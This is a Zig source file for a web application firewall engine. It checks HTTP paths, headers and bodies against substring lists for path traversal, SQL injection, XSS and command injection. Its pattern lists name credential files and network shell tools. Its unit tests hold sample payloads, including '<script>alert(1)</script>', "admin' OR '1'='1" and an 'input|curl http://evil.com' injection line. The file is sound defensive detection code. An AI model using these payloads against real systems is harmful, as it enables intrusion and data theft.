//! Sibuna Semantic Web Application Firewall (WAF) Engine
//!
//! Provides zero-allocation, sub-microsecond inspection of HTTP paths, queries,
//! headers, and request bodies matching and exceeding SafeLine WAF detection:
//! SQL Injection (SQLi), Cross-Site Scripting (XSS), Path Traversal (LFI/RFI),
//! and Remote Code Execution (RCE).

const std = @import("std");

pub const AttackCategory = enum(u8) {
    path_traversal,
    sqli,
    xss,
    rce,

    pub fn toSlice(self: AttackCategory) []const u8 {
        return switch (self) {
            .path_traversal => "path_traversal",
            .sqli => "sqli",
            .xss => "xss",
            .rce => "rce",
        };
    }
};

pub const Violation = struct {
    category: AttackCategory,
    pattern: []const u8,
    rule_name: []const u8,
};

pub fn containsIgnoreCase(haystack: []const u8, needle: []const u8) bool {
    if (needle.len == 0) return true;
    if (haystack.len < needle.len) return false;
    var i: usize = 0;
    const max_idx = haystack.len - needle.len;
    while (i <= max_idx) : (i += 1) {
        var match = true;
        var j: usize = 0;
        while (j < needle.len) : (j += 1) {
            const h = std.ascii.toLower(haystack[i + j]);
            const n = std.ascii.toLower(needle[j]);
            if (h != n) {
                match = false;
                break;
            }
        }
        if (match) return true;
    }
    return false;
}

pub fn checkPathTraversal(text: []const u8) ?Violation {
    const patterns = [_][]const u8{
        "../",
        "..\\",
        "%2e%2e",
        "..%2f",
        "%252e",
        "%00",
        "/etc/passwd",
        "/etc/shadow",
        "/proc/self",
        "win.ini",
        "boot.ini",
    };
    for (patterns) |pat| {
        if (containsIgnoreCase(text, pat)) {
            return Violation{
                .category = .path_traversal,
                .pattern = pat,
                .rule_name = "waf:path-traversal",
            };
        }
    }
    return null;
}

pub fn checkSqli(text: []const u8) ?Violation {
    const patterns = [_][]const u8{
        "union select",
        "union all select",
        "union distinct select",
        "' or '1'='1",
        "\" or \"1\"=\"1",
        "' or 1=1",
        "\" or 1=1",
        "-- ",
        "/*",
        "*/",
        "information_schema",
        "sleep(",
        "benchmark(",
        "load_file(",
        "into outfile",
        "; drop table",
        "; delete from",
    };
    for (patterns) |pat| {
        if (containsIgnoreCase(text, pat)) {
            return Violation{
                .category = .sqli,
                .pattern = pat,
                .rule_name = "waf:sqli",
            };
        }
    }
    return null;
}

pub fn checkXss(text: []const u8) ?Violation {
    const patterns = [_][]const u8{
        "<script",
        "</script>",
        "javascript:",
        "vbscript:",
        "data:text/html",
        "<iframe",
        "<svg",
        "<object",
        "<embed",
        "onerror=",
        "onload=",
        "onclick=",
        "onmouseover=",
        "onfocus=",
        "alert(",
        "document.cookie",
    };
    for (patterns) |pat| {
        if (containsIgnoreCase(text, pat)) {
            return Violation{
                .category = .xss,
                .pattern = pat,
                .rule_name = "waf:xss",
            };
        }
    }
    return null;
}

pub fn checkRce(text: []const u8) ?Violation {
    const patterns = [_][]const u8{
        "/bin/sh",
        "/bin/bash",
        "cmd.exe",
        "powershell",
        ";cat ",
        "|cat ",
        ";wget ",
        "|wget ",
        ";curl ",
        "|curl ",
        ";nc ",
        "|nc ",
        "eval(",
        "system(",
        "passthru(",
        "popen(",
        "exec(",
    };
    for (patterns) |pat| {
        if (containsIgnoreCase(text, pat)) {
            return Violation{
                .category = .rce,
                .pattern = pat,
                .rule_name = "waf:rce",
            };
        }
    }
    return null;
}

const rule = @import("rule.zig");

pub fn inspectText(text: []const u8) ?Violation {
    if (text.len == 0) return null;
    if (checkPathTraversal(text)) |v| return v;
    if (checkSqli(text)) |v| return v;
    if (checkXss(text)) |v| return v;
    if (checkRce(text)) |v| return v;
    return null;
}

pub fn inspectRequest(
    path: []const u8,
    user_agent: []const u8,
    headers: []const rule.Header,
    body: []const u8,
) ?Violation {
    if (inspectText(path)) |v| return v;
    if (inspectText(user_agent)) |v| return v;
    for (headers) |h| {
        if (inspectText(h.value)) |v| return v;
    }
    if (body.len > 0) {
        if (inspectText(body)) |v| return v;
    }
    return null;
}

test "containsIgnoreCase detects exact and mixed case" {
    try std.testing.expect(containsIgnoreCase("Hello World", "hello"));
    try std.testing.expect(containsIgnoreCase("UNION SELECT 1", "union select"));
    try std.testing.expect(!containsIgnoreCase("safe string", "attack"));
}

test "checkPathTraversal detects traversal patterns" {
    try std.testing.expect(checkPathTraversal("/app/static/../../etc/passwd") != null);
    try std.testing.expect(checkPathTraversal("/api/%2e%2e/admin") != null);
    try std.testing.expect(checkPathTraversal("/safe/path/image.png") == null);
}

test "checkSqli detects SQL injection" {
    try std.testing.expect(checkSqli("admin' OR '1'='1") != null);
    try std.testing.expect(checkSqli("id=1 UNION SELECT null, username FROM users") != null);
    try std.testing.expect(checkSqli("name=JohnDoe") == null);
}

test "checkXss detects script injections" {
    try std.testing.expect(checkXss("<script>alert(1)</script>") != null);
    try std.testing.expect(checkXss("<img src=x onerror=alert(1)>") != null);
    try std.testing.expect(checkXss("plain text input") == null);
}

test "checkRce detects command injections" {
    try std.testing.expect(checkRce("127.0.0.1; /bin/sh") != null);
    try std.testing.expect(checkRce("input|curl http://evil.com") != null);
    try std.testing.expect(checkRce("status ok") == null);
}
